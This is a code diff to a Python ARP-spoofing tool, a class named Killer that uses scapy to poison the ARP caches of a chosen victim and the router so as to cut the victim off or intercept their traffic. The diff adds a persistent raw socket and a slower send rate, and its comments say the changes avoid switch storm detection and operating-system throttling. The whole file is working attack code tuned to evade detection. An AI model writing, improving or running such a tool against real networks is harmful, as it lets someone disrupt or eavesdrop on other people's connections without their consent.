@@ -1,10 +1,12 @@
-from scapy.all import ARP, Ether, sendp, conf
+from scapy.all import ARP, Ether, conf, L2Socket
 from time import sleep
+import sys
 
 from networking.forwarder import MitmForwarder
 from tools.pfctl import ensure_pf_enabled, install_anchor, block_all_for, unblock_all_for
 from tools.utils import threaded, get_default_iface
 from constants import *
+
 
 class Killer:
     def __init__(self, router=DUMMY_ROUTER):
@@ -16,11 +18,52 @@ class Killer:
         self.storage = {}
         self.forwarders = {}
         self.pf_blocks = set()
+        self._socket = None  # Persistent L2 socket
+    
+    def _get_socket(self):
+        """Get or create persistent L2 socket - prevents Windows socket exhaustion"""
+        if self._socket is None:
+            try:
+                iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
+                self._socket = L2Socket(iface=iface)
+            except Exception:
+                self._socket = None
+        return self._socket
+    
+    def _send_packet(self, packet):
+        """Send packet using persistent socket, fallback to new socket if needed"""
+        sock = self._get_socket()
+        if sock:
+            try:
+                sock.send(packet)
+                return
+            except Exception:
+                # Socket died, recreate
+                self._close_socket()
+        
+        # Fallback: direct send (creates new socket)
+        try:
+            from scapy.all import sendp
+            iface = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
+            sendp(packet, iface=iface, verbose=0)
+        except Exception:
+            pass
+    
+    def _close_socket(self):
+        """Close persistent socket"""
+        if self._socket:
+            try:
+                self._socket.close()
+            except Exception:
+                pass
+            self._socket = None
     
     @threaded
-    def kill(self, victim, wait_after=1):
+    def kill(self, victim, wait_after=2):
         """
-        Spoofing victim
+        Spoofing victim.
+        Default 2 second delay - ARP cache lasts 30-120s, no need to spam.
+        Prevents Windows NDIS throttling.
         """
         if victim['mac'] in self.killed:
             return
@@ -28,6 +71,8 @@ class Killer:
         self.killed[victim['mac']] = victim
 
         # Send ARP reply (is-at) with proper Ethernet destination to poison caches
+        # Unicast to specific MAC, not broadcast - avoids switch storm detection
+        
         # Victim: tell victim that router IP is at our MAC
         to_victim = Ether(dst=victim['mac'])/ARP(
             op=2,
@@ -46,13 +91,11 @@ class Killer:
             hwdst=self.router['mac']
         )
 
-        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
-
         while victim['mac'] in self.killed \
             and self.iface.name != 'NULL':
-            # Send packets to both victim and router (L2 frames)
-            sendp(to_victim, iface=iface_to_use, verbose=0)
-            sendp(to_router, iface=iface_to_use, verbose=0)
+            # Send packets using persistent socket
+            self._send_packet(to_victim)
+            self._send_packet(to_router)
             sleep(wait_after)
 
         self._stop_forwarder(victim['mac'])
@@ -82,12 +125,12 @@ class Killer:
             hwdst=self.router['mac']
         )
 
-        iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
         if self.iface.name != 'NULL':
-            # Send packets to both victim and router
+            # Send restore packets 3 times
             for _ in range(3):
-                sendp(to_victim, iface=iface_to_use, verbose=0)
-                sendp(to_router, iface=iface_to_use, verbose=0)
+                self._send_packet(to_victim)
+                self._send_packet(to_router)
+                sleep(0.1)
         self._stop_forwarder(victim['mac'])
         self._remove_pf_block(victim['ip'])
 
@@ -110,6 +153,8 @@ class Killer:
             self._stop_forwarder(mac)
         for ip in list(self.pf_blocks):
             self._remove_pf_block(ip)
+        # Close persistent socket when done
+        self._close_socket()
     
     def store(self):
         """
